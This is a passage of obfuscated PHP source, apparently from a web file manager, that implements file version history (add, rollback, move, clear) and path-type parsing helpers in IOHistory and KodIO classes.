$BèÊé£÷∂ñ[$cÈ∏∆à˜Æª[367]]; if ($eÉƒóß ëŒ[$cÈ∏∆à˜Æª[78]] == 0) { return; } if ($eÉƒóß ëŒ[$cÈ∏∆à˜Æª[78]] >= 1024 * 1024 * 500) { return !1; } goto Bê◊ºÎçÊù; Bê◊ºÎçÊù: if ($c›ÿºÕÖ◊Õ && $c›ÿºÕÖ◊Õ[0][$cÈ∏∆à˜Æª[171]] == $c“•æìãΩà) { return !0; } if (array_key_exists($cÈ∏∆à˜Æª[196], $eÉƒóß ëŒ) && !$eÉƒóß ëŒ[$cÈ∏∆à˜Æª[196]]) { return !1; } $d±â˘∏∫¿ì = short_id(time()); goto D≤®∆¥Ù•Í; E˜Ωª™Úö†: if (!$EÜÂ•´Úı™) { self::clearEmptyFolder($BèÊé£÷∂ñ[$cÈ∏∆à˜Æª[1130]]); return !1; } array_unshift($c›ÿºÕÖ◊Õ, $FÉ¥Ôó†•©); if (count($c›ÿºÕÖ◊Õ) > $DÂô«…õÑ≠) { $e∫ˆ€¡›Ÿ = array_slice($c›ÿºÕÖ◊Õ, $DÂô«…õÑ≠); foreach ($e∫ˆ€¡›Ÿ as $C®ù–≠Ω‰‡) { IO::remove($BèÊé£÷∂ñ[$cÈ∏∆à˜Æª[1130]] . $C®ù–≠Ω‰‡[$cÈ∏∆à˜Æª[28]]); } $c›ÿºÕÖ◊Õ = array_slice($c›ÿºÕÖ◊Õ, 0, $DÂô«…õÑ≠); } goto c’∂‚≠ÈßÍ; c’∂‚≠ÈßÍ: return self::saveData($BèÊé£÷∂ñ[$cÈ∏∆à˜Æª[1131]], $c›ÿºÕÖ◊Õ); goto BßΩãÓ±ó∫; aÈÒ≥»ìåà: $cÈ∏∆à˜Æª =& $_SERVER[ú∫]; $BèÊé£÷∂ñ = self::listData($F£Û√®èÏ¨); if (!$BèÊé£÷∂ñ) { return; } goto d≤≈ËÖÕÉ‘; cıÂ´¢êÌÉ: if ($cÑÙè∆ıî€ <= 0) { return; } $c“•æìãΩà = IO::hashSimple($F£Û√®èÏ¨); $eÉƒóß ëŒ = IO::info($F£Û√®èÏ¨); goto cÛ≥¨íé÷ó; D≤®∆¥Ù•Í: $FÉ¥Ôó†•© = array($cÈ∏∆à˜Æª[393] => $d±â˘∏∫¿ì, $cÈ∏∆à˜Æª[171] => $c“•æìãΩà, $cÈ∏∆à˜Æª[28] => $eÉƒóß ëŒ[$cÈ∏∆à˜Æª[28]] . $cÈ∏∆à˜Æª[95] . date($cÈ∏∆à˜Æª[1128]) . rand_string(1), $cÈ∏∆à˜Æª[78] => $eÉƒóß ëŒ[$cÈ∏∆à˜Æª[78]], $cÈ∏∆à˜Æª[432] => USER_ID, $cÈ∏∆à˜Æª[194] => time(), $cÈ∏∆à˜Æª[1129] => $cÈ∏∆à˜Æª[33]); IO::mkdir($BèÊé£÷∂ñ[$cÈ∏∆à˜Æª[1130]]); $EÜÂ•´Úı™ = IO::copy($F£Û√®èÏ¨, $BèÊé£÷∂ñ[$cÈ∏∆à˜Æª[1130]], !1, $FÉ¥Ôó†•©[$cÈ∏∆à˜Æª[28]]); goto E˜Ωª™Úö†; d≤≈ËÖÕÉ‘: $cª¶¨™©˘É = Model($cÈ∏∆à˜Æª[730])->get($cÈ∏∆à˜Æª[1126]); $cÑÙè∆ıî€ = $GLOBALS[$cÈ∏∆à˜Æª[6]][$cÈ∏∆à˜Æª[88]][$cÈ∏∆à˜Æª[1104]]; $DÂô«…õÑ≠ = $cª¶¨™©˘É == $cÈ∏∆à˜Æª[1127] ? 5 : $cÑÙè∆ıî€; goto cıÂ´¢êÌÉ; BßΩãÓ±ó∫: } public static function remove($E©ÜªΩﬁôÃ, $eéñè‘¯Â√) { $D∏Û≈Óïá± =& $_SERVER[ú∫]; $E¶¨ ì∞ÇÛ = self::listData($E©ÜªΩﬁôÃ); $Eâ”é‰®¥Õ = array(); if (!$E¶¨ ì∞ÇÛ) { return !1; } foreach ($E¶¨ ì∞ÇÛ[$D∏Û≈Óïá±[367]] as $cÒÚÔâ”èò) { if ($cÒÚÔâ”èò[$D∏Û≈Óïá±[393]] == $eéñè‘¯Â√) { IO::remove($E¶¨ ì∞ÇÛ[$D∏Û≈Óïá±[1130]] . $cÒÚÔâ”èò[$D∏Û≈Óïá±[28]]); continue; } $Eâ”é‰®¥Õ[] = $cÒÚÔâ”èò; } return self::saveData($E¶¨ ì∞ÇÛ[$D∏Û≈Óïá±[1131]], $Eâ”é‰®¥Õ); } public static function clear($c∆˜ŸÒ‚‘ú, $b’ÇÍá¿«ë = true) { $Bì€«ó∏ﬂÚ =& $_SERVER[ú∫]; $b±ÍΩ»ãè° = self::listData($c∆˜ŸÒ‚‘ú, $b’ÇÍá¿«ë); if (!$b±ÍΩ»ãè°) { return !1; } foreach ($b±ÍΩ»ãè°[$Bì€«ó∏ﬂÚ[367]] as $AÎæ¯üçÌÓ) { IO::remove($b±ÍΩ»ãè°[$Bì€«ó∏ﬂÚ[1130]] . $AÎæ¯üçÌÓ[$Bì€«ó∏ﬂÚ[28]]); } return self::saveData($b±ÍΩ»ãè°[$Bì€«ó∏ﬂÚ[1131]], array()); } public static function moveHistory($C…èªîπÜ€, $dÇ∫‰≥£ÎÏ = '', $C∞Ïì⁄¢Û¢ = '') { goto Cû∞£Ω‚É; AÑäç¥∆–Ô: $E† íπäÀ– = $aûëªöΩßŒ[1118]; $dÇ∫‰≥£ÎÏ = $dÇ∫‰≥£ÎÏ ? $dÇ∫‰≥£ÎÏ : get_path_this($C…èªîπÜ€); $C∞Ïì⁄¢Û¢ = $C∞Ïì⁄¢Û¢ ? $C∞Ïì⁄¢Û¢ : $fÃÆ¢è˘à†[$aûëªöΩßŒ[1130]]; goto A⁄àÓë¯ﬁï; Cû∞£Ω‚É: $aûëªöΩßŒ =& $_SERVER[ú∫]; $fÃÆ¢è˘à† = self::listData($C…èªîπÜ€, !1); if (!$fÃÆ¢è˘à† || !$fÃÆ¢è˘à†[$aûëªöΩßŒ[367]]) { return !1; } goto AÑäç¥∆–Ô; A⁄àÓë¯ﬁï: $C‘´†ï‚π≠ = substr(get_path_this($fÃÆ¢è˘à†[$aûëªöΩßŒ[1131]]), 0, -strlen($E† íπäÀ–)); foreach ($fÃÆ¢è˘à†[$aûëªöΩßŒ[367]] as $cøÈﬂâÎ…Ü => $bﬁ¶ •ä®ª) { $Eå∑°»…√’ = $dÇ∫‰≥£ÎÏ . substr($bﬁ¶ •ä®ª[$aûëªöΩßŒ[28]], strlen($C‘´†ï‚π≠)); $cıÇ≤äÊ¥ = IO::move($fÃÆ¢è˘à†[$aûëªöΩßŒ[1130]] . $bﬁ¶ •ä®ª[$aûëªöΩßŒ[28]], $C∞Ïì⁄¢Û¢, !1, $Eå∑°»…√’); if ($cıÇ≤äÊ¥) { $fÃÆ¢è˘à†[$aûëªöΩßŒ[367]][$cøÈﬂâÎ…Ü][$aûëªöΩßŒ[28]] = $Eå∑°»…√’; } } $fÃÆ¢è˘à†[$aûëªöΩßŒ[1131]] = IO::move($fÃÆ¢è˘à†[$aûëªöΩßŒ[1131]], $C∞Ïì⁄¢Û¢, !1, $dÇ∫‰≥£ÎÏ . $E† íπäÀ–); goto E‚§Í«„°æ; E‚§Í«„°æ: self::saveData($fÃÆ¢è˘à†[$aûëªöΩßŒ[1131]], $fÃÆ¢è˘à†[$aûëªöΩßŒ[367]]); self::clearEmptyFolder($fÃÆ¢è˘à†[$aûëªöΩßŒ[1130]]); goto DÒ†›Â¬πª; DÒ†›Â¬πª: } public static function rollback($dáŒÙ‚óÁƒ, $cÀïŸ©◊Ï∆) { $C©»◊Æ°É¢ =& $_SERVER[ú∫]; $béŸù¶©È» = self::listData($dáŒÙ‚óÁƒ); if (!$béŸù¶©È») { return; } $d‡±ö‰÷ºÎ = IO::info($dáŒÙ‚óÁƒ); foreach ($béŸù¶©È»[$C©»◊Æ°É¢[367]] as $d∆ß∫…≠æ∑ => $aÉà˜ﬁŒ¢é) { if ($aÉà˜ﬁŒ¢é[$C©»◊Æ°É¢[393]] == $cÀïŸ©◊Ï∆) { self::add($dáŒÙ‚óÁƒ); $DÏöÛÉî¨ = $béŸù¶©È»[$C©»◊Æ°É¢[1130]] . $aÉà˜ﬁŒ¢é[$C©»◊Æ°É¢[28]]; $A’¯°∫®¬ = IO::copy($DÏöÛÉî¨, IO::pathFather($dáŒÙ‚óÁƒ), REPEAT_REPLACE, $d‡±ö‰÷ºÎ[$C©»◊Æ°É¢[28]]); if ($A’¯°∫®¬) { self::remove($dáŒÙ‚óÁƒ, $cÀïŸ©◊Ï∆); } return $A’¯°∫®¬; } } return !1; } public static function setDetail($AåÊ—àæ’∆, $d≤ÿñøá·¡, $AΩŸüÁ∆Á™) { $Fãùª˘„≈Ó =& $_SERVER[ú∫]; $b´€äÉä¡ = self::listData($AåÊ—àæ’∆); if (!$b´€äÉä¡) { return; } foreach ($b´€äÉä¡[$Fãùª˘„≈Ó[367]] as $eçàò¯ﬁ™É => $B∑øÃû¢Ì) { if ($B∑øÃû¢Ì[$Fãùª˘„≈Ó[393]] == $d≤ÿñøá·¡) { $b´€äÉä¡[$Fãùª˘„≈Ó[367]][$eçàò¯ﬁ™É][$Fãùª˘„≈Ó[1129]] = $AΩŸüÁ∆Á™; self::saveData($b´€äÉä¡[$Fãùª˘„≈Ó[1131]], $b´€äÉä¡[$Fãùª˘„≈Ó[367]]); return !0; } } return !1; } public static function fileInfo($Eâ—≤ƒèäá, $C¨æåé““ˆ) { goto fúÃ◊€¬≈Â; fúÃ◊€¬≈Â: $aê™Úö¢˜¶ =& $_SERVER[ú∫]; $F‰ò≠‘áê˜ = self::listData($Eâ—≤ƒèäá); if (!$F‰ò≠‘áê˜) { show_json(LNG($aê™Úö¢˜¶[105]), !1); } goto aåÚ¬±«∫ù; aåÚ¬±«∫ù: $bÍïœ®ÿ±‡ = $aê™Úö¢˜¶[33]; foreach ($F‰ò≠‘áê˜[$aê™Úö¢˜¶[367]] as $cûôÉ‹Ò¨é => $f¥Û∫‘æÁÛ) { if ($f¥Û∫‘æÁÛ[$aê™Úö¢˜¶[393]] != $C¨æåé““ˆ) { continue; } $bÍïœ®ÿ±‡ = $F‰ò≠‘áê˜[$aê™Úö¢˜¶[1130]] . $f¥Û∫‘æÁÛ[$aê™Úö¢˜¶[28]]; break; } if (!$bÍïœ®ÿ±‡) { show_json(LNG($aê™Úö¢˜¶[105]), !1); } goto BëÃ–Ñßƒ; BëÃ–Ñßƒ: return IO::info($bÍïœ®ÿ±‡); goto aı‡¢£¿ÉÉ; aı‡¢£¿ÉÉ: } public static function fileOut($EªÓˆàÈÓ⁄, $A•≥ãÜæ‰µ, $Bı–£àÊÚÖ = false) { $bá»ÜØôÒœ =& $_SERVER[ú∫]; $E≤ΩÑå¯ÀÆ = self::fileInfo($EªÓˆàÈÓ⁄, $A•≥ãÜæ‰µ); $f…ˆ§˜’Ç¢ =& $GLOBALS[$bá»ÜØôÒœ[7]]; $Bı–£àÊÚÖ = isset($f…ˆ§˜’Ç¢[$bá»ÜØôÒœ[1094]]) && $f…ˆ§˜’Ç¢[$bá»ÜØôÒœ[1094]] == 1; if (isset($f…ˆ§˜’Ç¢[$bá»ÜØôÒœ[29]]) && $f…ˆ§˜’Ç¢[$bá»ÜØôÒœ[29]] == $bá»ÜØôÒœ[1132]) { return IO::fileOutImage($E≤ΩÑå¯ÀÆ[$bá»ÜØôÒœ[76]], $f…ˆ§˜’Ç¢[$bá»ÜØôÒœ[1133]]); } IO::fileOut($E≤ΩÑå¯ÀÆ[$bá»ÜØôÒœ[76]], $Bı–£àÊÚÖ, get_path_this($EªÓˆàÈÓ⁄)); } public static function listData($E™á£…‡øÓ, $FªÖÈôì”π = true) { goto dπèπâ äà; Aª∆¬û¡Ëå: $aûÓ“ŒÃ√ã = IO::getContent($D√ÿÕııî‚[$BÚ„‘Ñ•˘ƒ[1131]]); if ($aûÓ“ŒÃ√ã) { $Aõ†œîéÛ≈ = json_decode($aûÓ“ŒÃ√ã, !0); if (is_array($Aõ†œîéÛ≈)) { $D√ÿÕııî‚[$BÚ„‘Ñ•˘ƒ[367]] = $Aõ†œîéÛ≈; } } return $D√ÿÕııî‚; goto e©¡à≥……«; dπèπâ äà: $BÚ„‘Ñ•˘ƒ =& $_SERVER[ú∫]; if ($FªÖÈôì”π && !IO::exist($E™á£…‡øÓ)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto a¢Ü›◊œÙ; a¢Ü›◊œÙ: if (substr($E™á£…‡øÓ, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $D©ªüÕÒÈ¿ = self::pathHistory($E™á£…‡øÓ); $D√ÿÕııî‚ = array($BÚ„‘Ñ•˘ƒ[1131] => $D©ªüÕÒÈ¿ . $BÚ„‘Ñ•˘ƒ[1118], $BÚ„‘Ñ•˘ƒ[1130] => rtrim(get_path_father($D©ªüÕÒÈ¿), $BÚ„‘Ñ•˘ƒ[8]) . $BÚ„‘Ñ•˘ƒ[8], $BÚ„‘Ñ•˘ƒ[367] => array()); goto Aª∆¬û¡Ëå; e©¡à≥……«: } private static function saveData($bŒÇñ≥û¥∂, $cüÜı®»ΩÓ) { goto FŸéòü∂„µ; b†àƒÔëçË: return !0; goto b∏ÑıÑ¢©ö; F£≤Ê±◊∑±: $AòË¯·√“ô = IO::pathFather($bŒÇñ≥û¥∂); IO::remove($bŒÇñ≥û¥∂); self::clearEmptyFolder($AòË¯·√“ô); goto b†àƒÔëçË; FŸéòü∂„µ: $EÈ◊ı’Ω‹© =& $_SERVER[ú∫]; self::log($EÈ◊ı’Ω‹©[1134] . $bŒÇñ≥û¥∂ . $EÈ◊ı’Ω‹©[68] . count($cüÜı®»ΩÓ), $EÈ◊ı’Ω‹©[712]); if ($cüÜı®»ΩÓ) { return IO::setContent($bŒÇñ≥û¥∂, json_encode($cüÜı®»ΩÓ)); } goto F£≤Ê±◊∑±; b∏ÑıÑ¢©ö: } public static function clearEmptyFolder($BˆÇÆ«∞ä¨) { goto eèÉ¢´ÿÁö; c»Í≈‡´∏‡: $e⁄á§›ö°Ë = IO::has($BˆÇÆ«∞ä¨, !0); if ($e⁄á§›ö°Ë[$cÈ¬çÕÇ◊∑[203]] > 0 || $e⁄á§›ö°Ë[$cÈ¬çÕÇ◊∑[204]] > 0) { return; } IO::remove($BˆÇÆ«∞ä¨); goto B±®åœŸù„; B±®åœŸù„: self::clearEmptyFolder($c´ÉŒïÍ˘á); goto bô≠´º »Ü; eèÉ¢´ÿÁö: $cÈ¬çÕÇ◊∑ =& $_SERVER[ú∫]; if (trim($BˆÇÆ«∞ä¨, $cÈ¬çÕÇ◊∑[8]) == trim(self::$_historyBase, $cÈ¬çÕÇ◊∑[8])) { return; } $c´ÉŒïÍ˘á = IO::pathFather($BˆÇÆ«∞ä¨); goto c»Í≈‡´∏‡; bô≠´º »Ü: } private static function getBasePath() { goto f∏¢ë≤ø¨√; Aè÷ËÔŒÁ–: $E…Æüß£Ì— = DATA_PATH . $Aﬂ⁄´Ü´±◊[1137] . rand_string(8) . $Aﬂ⁄´Ü´±◊[8]; $E…Æüß£Ì— = IO::mkdir($E…Æüß£Ì—); $E…Æüß£Ì— = rtrim($E…Æüß£Ì—, $Aﬂ⁄´Ü´±◊[8]) . $Aﬂ⁄´Ü´±◊[8]; goto B•Õ∫Æ±Õ˜; e∏Ö™˜Ωñ¥: return $E…Æüß£Ì—; goto BŒ œÎ¨Ω¶; B•Õ∫Æ±Õ˜: file_put_contents($E…Æüß£Ì— . $Aﬂ⁄´Ü´±◊[1138], $Aﬂ⁄´Ü´±◊[33]); file_put_contents(DATA_PATH . $Aﬂ⁄´Ü´±◊[1138], $Aﬂ⁄´Ü´±◊[33]); Model($Aﬂ⁄´Ü´±◊[1135])->set($Aﬂ⁄´Ü´±◊[1136], $E…Æüß£Ì—); goto e∏Ö™˜Ωñ¥; f∏¢ë≤ø¨√: $Aﬂ⁄´Ü´±◊ =& $_SERVER[ú∫]; $E…Æüß£Ì— = Model($Aﬂ⁄´Ü´±◊[1135])->get($Aﬂ⁄´Ü´±◊[1136]); if ($E…Æüß£Ì—) { if (!IO::exist($E…Æüß£Ì—)) { IO::mkdir($E…Æüß£Ì—); } if (get_path_this($E…Æüß£Ì—) == $Aﬂ⁄´Ü´±◊[1121]) { $EÒÂá‚¶Üﬁ = $Aﬂ⁄´Ü´±◊[1137] . rand_string(8); @rename($E…Æüß£Ì—, get_path_father($E…Æüß£Ì—) . $Aﬂ⁄´Ü´±◊[8] . $EÒÂá‚¶Üﬁ); $E…Æüß£Ì— = DATA_PATH . $EÒÂá‚¶Üﬁ . $Aﬂ⁄´Ü´±◊[8]; file_put_contents(DATA_PATH . $Aﬂ⁄´Ü´±◊[1138], $Aﬂ⁄´Ü´±◊[33]); Model($Aﬂ⁄´Ü´±◊[1135])->set($Aﬂ⁄´Ü´±◊[1136], $E…Æüß£Ì—); } return $E…Æüß£Ì—; } goto Aè÷ËÔŒÁ–; BŒ œÎ¨Ω¶: } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\x75\x72\x63\x65\x7d"; const KOD_USER_RECYCLE = "\x7b\165\x73\x65\162\x52\x65\143\x79\x63\x6c\145\x7d"; const KOD_USER_FAV = "\173\165\x73\x65\x72\106\x61\x76\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\x73\145\162\106\x69\x6c\145\x54\x61\x67\x7d"; const KOD_USER_FILE_TYPE = "\x7b\165\x73\x65\x72\106\151\154\145\x54\171\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\x72\x6f\x75\x70\x52\x6f\x6f\x74\123\x65\x6c\146\175"; const KOD_USER_SHARE = "\173\x75\x73\x65\x72\x53\150\141\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\x65\162\x53\150\x61\x72\x65\114\x69\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\150\141\162\x65\124\x6f\115\x65\175"; const KOD_SHARE_ITEM = "\173\x73\150\x61\162\145\x49\164\145\x6d\175"; const KOD_SHARE_LINK = "\173\163\x68\141\162\x65\x49\164\145\155\114\151\x6e\153\175"; const KOD_SEARCH = "\173\163\x65\141\162\x63\x68\175"; const KOD_BLOCK = "\173\x62\154\x6f\143\x6b\x7d"; const KOD_IO = "\x7b\151\157\x7d"; const KOD_USER_RECENT = "\x7b\x75\x73\145\x72\x52\x65\156\x63\145\x6e\164\175"; const KOD_USER_DRIVER = "\173\144\x72\x69\x76\145\162\175"; public static function typeList() { $fÂÀ›ÀáëÀ =& $_SERVER[ú∫]; return array($fÂÀ›ÀáëÀ[1139] => self::KOD_SOURCE, $fÂÀ›ÀáëÀ[1140] => self::KOD_USER_RECYCLE, $fÂÀ›ÀáëÀ[1141] => self::KOD_USER_FAV, $fÂÀ›ÀáëÀ[1142] => self::KOD_USER_FILE_TAG, $fÂÀ›ÀáëÀ[1143] => self::KOD_USER_FILE_TYPE, $fÂÀ›ÀáëÀ[1144] => self::KOD_GROUP_ROOT_SELF, $fÂÀ›ÀáëÀ[1145] => self::KOD_USER_SHARE, $fÂÀ›ÀáëÀ[1146] => self::KOD_USER_SHARE_LINK, $fÂÀ›ÀáëÀ[1147] => self::KOD_USER_SHARE_TO_ME, $fÂÀ›ÀáëÀ[1148] => self::KOD_SHARE_ITEM, $fÂÀ›ÀáëÀ[1149] => self::KOD_SHARE_LINK, $fÂÀ›ÀáëÀ[1150] => self::KOD_SEARCH, $fÂÀ›ÀáëÀ[1151] => self::KOD_BLOCK, $fÂÀ›ÀáëÀ[1152] => self::KOD_IO, $fÂÀ›ÀáëÀ[1153] => self::KOD_USER_RECENT, $fÂÀ›ÀáëÀ[1154] => self::KOD_USER_DRIVER); } public static function parse($C´√ÂäÊÏ’) { goto B‹ÑÆÎæÌ•; cöîÉı‰ÒÕ: $aàÆæÙ≈ê = array($C•∂éÜÛ°√[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $cÑ‚¯Ñ∆Í–[$C•∂éÜÛ°√[1120]] = in_array($cÑ‚¯Ñ∆Í–[$C•∂éÜÛ°√[29]], $aàÆæÙ≈ê); return $cÑ‚¯Ñ∆Í–; goto BÆÖ∞ûÉÔ¶; açö˘ïä: preg_match($C•∂éÜÛ°√[1155], $C´√ÂäÊÏ’, $Fç åÌò¥ﬁ); $cÑ‚¯Ñ∆Í– = array($C•∂éÜÛ°√[415] => !1, $C•∂éÜÛ°√[1156] => !1, $C•∂éÜÛ°√[412] => !1, $C•∂éÜÛ°√[76] => $C´√ÂäÊÏ’, $C•∂éÜÛ°√[1065] => !1, $C•∂éÜÛ°√[1064] => $C•∂éÜÛ°√[33]); if (is_array($Fç åÌò¥ﬁ) && count($Fç åÌò¥ﬁ) == 5) { $e≈®Úﬁ≤ª÷ = $C•∂éÜÛ°√[1157] . $Fç åÌò¥ﬁ[2] . $C•∂éÜÛ°√[325]; if (in_array($e≈®Úﬁ≤ª÷, $c‡ß∂⁄öÚÒ)) { $cÑ‚¯Ñ∆Í–[$C•∂éÜÛ°√[1065]] = $Fç åÌò¥ﬁ[1]; $cÑ‚¯Ñ∆Í–[$C•∂éÜÛ°√[29]] = $e≈®Úﬁ≤ª÷; $cÑ‚¯Ñ∆Í–[$C•∂éÜÛ°√[1158]] = substr($e≈®Úﬁ≤ª÷, 1, -1); $cÑ‚¯Ñ∆Í–[$C•∂éÜÛ°√[393]] = $Fç åÌò¥ﬁ[3]; } $cÑ‚¯Ñ∆Í–[$C•∂éÜÛ°√[1064]] = $Fç åÌò¥ﬁ[4]; } goto cöîÉı‰ÒÕ; B‹ÑÆÎæÌ•: $C•∂éÜÛ°√ =& $_SERVER[ú∫]; $C´√ÂäÊÏ’ = self::clear($C´√ÂäÊÏ’); $c‡ß∂⁄öÚÒ = array_values(self::typeList()); goto açö˘ïä; BÆÖ∞ûÉÔ¶: } public static function isTruePath($bé˘çÀÙ¥ê) { goto b“∏Ôä∫™ã; DñÃëŒÃÈà: if (strpos($bé˘çÀÙ¥ê, $cï∞¿√öÇñ[1161]) === 0) { return !0; } return !1; goto DÑ˘ÏÑ∆¯; f Ç§å≤∂Ì: if (strpos($bé˘çÀÙ¥ê, $cï∞¿√öÇñ[1124]) === 0) { return !0; } if (strpos($bé˘çÀÙ¥ê, $cï∞¿√öÇñ[1159]) === 0) { return !0; } if (strpos($bé˘çÀÙ¥ê, $cï∞¿√öÇñ[1160]) === 0) { return !0; } goto DñÃëŒÃÈà; b“∏Ôä∫™ã: $cï∞¿√öÇñ =& $_SERVER[ú∫]; if (substr($bé˘çÀÙ¥ê, 0, 1) != $cï∞¿√öÇñ[1157]) { return !0; } if (strpos($bé˘çÀÙ¥ê, $cï∞¿√öÇñ[401]) === 0) { return !0; } goto f Ç§å≤∂Ì; DÑ˘ÏÑ∆¯: } public static function clear($fè≤÷ÕßÍ¥) { goto E¬É›ﬂëíç; eÜ÷∆°õ÷Ø: $EÚ”¿‡•≠Ÿ = $fÑ¨Ω¨’‰ò[1162]; if (substr($fè≤÷ÕßÍ¥, 0, 3) == $fÑ¨Ω¨’‰ò[1163]) { $fè≤÷ÕßÍ¥ = substr($fè≤÷ÕßÍ¥, 3); } while (strstr($fè≤÷ÕßÍ¥, $EÚ”¿‡•≠Ÿ)) { $fè≤÷ÕßÍ¥ = str_replace($EÚ”¿‡•≠Ÿ, $fÑ¨Ω¨’‰ò[8], $fè≤÷ÕßÍ¥); } goto bﬂ“Ì¢Éﬁ•; f„Æ√∂™àŒ: return $fè≤÷ÕßÍ¥; goto b»Œ˜≤ôÈº; E¬É›ﬂëíç: $fÑ¨Ω¨’‰ò =& $_SERVER[ú∫]; $fè≤÷ÕßÍ¥ = str_replace(array($fÑ¨Ω¨’‰ò[1038], $fÑ¨Ω¨’‰ò[229]), $fÑ¨Ω¨’‰ò[50], $fè≤÷ÕßÍ¥); $fè≤÷ÕßÍ¥ = str_replace($fÑ¨Ω¨’‰ò[97], $fÑ¨Ω¨’‰ò[8], $fè≤÷ÕßÍ¥); goto eÜ÷∆°õ÷Ø; bﬂ“Ì¢Éﬁ•: $fè≤÷ÕßÍ¥ = preg_replace($fÑ¨Ω¨’‰ò[1164], $fÑ¨Ω¨’‰ò[8], $fè≤÷ÕßÍ¥); if ($fè≤÷ÕßÍ¥ == $fÑ¨Ω¨’‰ò[8]) { return $fÑ¨Ω¨’‰ò[8]; } $fè≤÷ÕßÍ¥ = rtrim($fè≤÷ÕßÍ¥, $fÑ¨Ω¨’‰ò[8]); goto f„Æ√∂™àŒ; b»Œ˜≤ôÈº: } public static function sourceID($a·îÎ«è´Ô) { $a’åîﬁïó¬ =& $_SERVER[ú∫]; $C∞Ô∞õ»£á = self::parse($a·îÎ«è´Ô); if ($C∞Ô∞õ»£á[$a’åîﬁïó¬[29]] !== self::KOD_SOURCE) { show_json(LNG($a’åîﬁïó¬[1165]), !1); } return $C∞Ô∞õ»£á[$a’åîﬁïó¬[393]]; } public static function make($DëÍØ‰ªÙÑ) { if (!$DëÍØ‰ªÙÑ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($DëÍØ‰ªÙÑ)); } public static function makeShare($C∑£Íª˘öã, $d…≠º£”»ñ) { return self::makePath(self::KOD_SHARE_ITEM, $C∑£Íª˘öã, $d…≠º£”»ñ); } public static function makeFileTypePath($aø†Ã©Ì›ˆ) { return self::makePath(self::KOD_USER_FILE_TYPE, $aø†Ã©Ì›ˆ); } public static function makeFileTagPath($eÉÀ™≥Ÿπí) { return self::makePath(self::KOD_USER_FILE_TAG, $eÉÀ™≥Ÿπí); } public static function makePath($FﬁïÀñßÛà, $B¨Ô´öÊ∂≥ = '', $bâêÕ≠ÙÑï = '') { $f∑è«Õùô⁄ =& $_SERVER[ú∫]; $B¬®îŒé∫È = substr($FﬁïÀñßÛà, 1, -1); $CÀÎÕÆ€Á◊ = $f∑è«Õùô⁄[1166] . $B¬®îŒé∫È . $f∑è«Õùô⁄[1167] . $B¨Ô´öÊ∂≥ . $f∑è«Õùô⁄[1168]; $CÀÎÕÆ€Á◊ = $bâêÕ≠ÙÑï ? $CÀÎÕÆ€Á◊ . $bâêÕ≠ÙÑï . $f∑è«Õùô⁄[8] : $CÀÎÕÆ€Á◊; return $CÀÎÕÆ€Á◊; } public static function hashPath($Fé¿Ó»ﬁ˘ı, $A∑ÔÙ·≤∂° = true) { goto fç¿ó—≥’∫; a¶ÔèÍî≥À: if (!$DÔåÑñÆΩ‹ && isset($A£¨÷¯´ºñ[$FœÊÎÏ⁄¶ä[395]])) { $A£¨÷¯´ºñ = IO::info(KodIO::make($A£¨÷¯´ºñ[$FœÊÎÏ⁄¶ä[395]])); $DÔåÑñÆΩ‹ = _get($A£¨÷¯´ºñ, $FœÊÎÏ⁄¶ä[1169], $FœÊÎÏ⁄¶ä[33]); } if (!$DÔåÑñÆΩ‹ && $A∑ÔÙ·≤∂°) { $FœÆË®ﬁñ… = KodIO::parse($A£¨÷¯´ºñ[$FœÊÎÏ⁄¶ä[76]]); if (!$FœÆË®ﬁñ…[$FœÊÎÏ⁄¶ä[29]]) { $DÔåÑñÆΩ‹ = IO::hashSimple($A£¨÷¯´ºñ[$FœÊÎÏ⁄¶ä[76]]); } } if (!$DÔåÑñÆΩ‹) { $DÔåÑñÆΩ‹ = md5($A£¨÷¯´ºñ[$FœÊÎÏ⁄¶ä[76]] . $A£¨÷¯´ºñ[$FœÊÎÏ⁄¶ä[78]] . $A£¨÷¯´ºñ[$FœÊÎÏ⁄¶ä[84]]); } goto Bµﬁ≥ˆº˜ê; fç¿ó—≥’∫: $FœÊÎÏ⁄¶ä =& $_SERVER[ú∫]; $A£¨÷¯´ºñ = is_array($Fé¿Ó»ﬁ˘ı) ? $Fé¿Ó»ﬁ˘ı : IO::info($Fé¿Ó»ﬁ˘ı); $DÔåÑñÆΩ‹ = _get($A£¨÷¯´ºñ, $FœÊÎÏ⁄¶ä[1169], $FœÊÎÏ⁄¶ä[33]); goto a¶ÔèÍî≥À; Bµﬁ≥ˆº˜ê: return $DÔåÑñÆΩ‹; goto cö¿≈ì∞‚≈; cö¿≈ì∞‚≈: } public static function initSystemPath() { goto cªõé˜ÑÌë; cªõé˜ÑÌë: $DÜÛÒûÕ…π =& $_SERVER[ú∫]; if (defined($DÜÛÒûÕ…π[1170])) { return; } define($DÜÛÒûÕ…π[1170], self::systemPath($DÜÛÒûÕ…π[1171])); goto a∂∆§∑œŒû; fÀ˜¶óπÿ∆: IOHistory::bindEvent(); goto cÛ∑ƒÃ≤Ú≥; a∂∆§∑œŒû: define($DÜÛÒûÕ…π[1172], self::systemPath($DÜÛÒûÕ…π[1173])); define($DÜÛÒûÕ…π[1174], self::systemPath($DÜÛÒûÕ…π[1175])); define($DÜÛÒûÕ…π[1176], self::systemPath($DÜÛÒûÕ…π[1177])); goto fÀ˜¶óπÿ∆; cÛ∑ƒÃ≤Ú≥: } public static function systemPath($b¶úè´ÜÚ‚) { goto AæÎöéÖ Ö; CÁÊÊÙ„å¢: if ($Cü„ïØÉ¥Ò) { return $Cü„ïØÉ¥Ò; } if ($b¶úè´ÜÚ‚ == $FÉÆóôÓ≤⁄[1171]) { $Cü„ïØÉ¥Ò = self::make(Model($FÉÆóôÓ≤⁄[790])->systemRootPathAdd($FÉÆóôÓ≤⁄[505])); } else { $Cü„ïØÉ¥Ò = self::systemPath($FÉÆóôÓ≤⁄[1171]); $D¥£≥üÿ±‰ = self::sourceID($Cü„ïØÉ¥Ò); $Cü„ïØÉ¥Ò = 